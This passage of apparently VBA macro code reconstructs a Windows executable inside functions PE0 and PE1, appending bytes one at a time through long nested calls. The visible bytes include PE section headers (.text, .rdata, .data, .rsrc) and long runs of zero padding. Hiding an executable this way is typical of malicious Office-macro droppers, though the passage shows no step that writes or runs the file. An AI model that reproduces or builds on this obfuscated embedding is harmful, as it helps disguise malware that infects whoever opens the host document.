    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 224), 0), 15), 1), 11), 1), 6), 0), 0), 176), 0), 0), 0), 160), 0), 0), 0), 0), 0), 0), "]m"), 0), 0), 0), 16), 0), 0), 0), 192), 0), 0), 0), 0), "@"), 0), 0), 16), 0), 0), 0), 16), 0), 0), 4), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 4), 0), 0), 0), 0), 0), 0), 0), 0), "`"), 1), 0), 0), 16), 0), 0), 0), 0), 0), 0), 2), 0), 0), 0), 0), 0), 16), 0), 0), 16), 0), 0), 0), 0), 16), 0), 0), 16), 0), 0), 0), 0), 0), 0), 16), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "l"), 199), 0), 0), "x"), 0), 0), 0), 0), "P"), 1), 0), 200), 7), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 224), 193), 0), 0), 28), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 192)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 224), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), ".text"), 0), 0), 0), "f"), 169), 0), 0), 0), 16), 0), 0), 0), 176), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 16), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), " "), 0), 0), "`.rdata"), 0), 0), 230), 15), 0), 0), 0), 192), 0), 0), 0), 16), 0), 0), 0), 192), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), "@"), 0), 0), "@.data"), 0), 0), 0), "\p"), 0), 0), 0), 208), 0), 0), 0), "@"), 0), 0), 0), 208), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), 0), 192)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, ".rsrc"), 0), 0), 0), 200), 7), 0), 0), 0), "P"), 1), 0), 0), 16), 0), 0), 0), 16), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "@"), 0), 0), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE0 = strPE
End Function

Private Function PE1() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
